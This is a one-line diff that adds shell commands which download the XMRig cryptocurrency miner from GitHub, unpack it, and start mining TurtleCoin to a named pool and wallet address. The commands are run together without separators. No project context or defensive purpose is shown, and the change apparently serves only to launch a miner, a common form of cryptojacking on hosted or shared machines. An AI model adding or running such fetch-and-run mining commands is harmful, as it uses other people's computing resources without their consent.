@@ -1,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz ls cd xmrig-6.15.0 ./xmrig --donate-level 1 -o us.turtlecoin.herominers.com:1160 -u TRTLuxuspk5RRZGonqH7ekALCV2qmp5Uh3itjZKqQzKYa3pidew9jZniKVX6CVU8ZJ2roJFctLvCtbDiHwPpqNa6Pden3wUBuEr.WOKER1 -p x -a argon2/chukwav2 -k -t 2
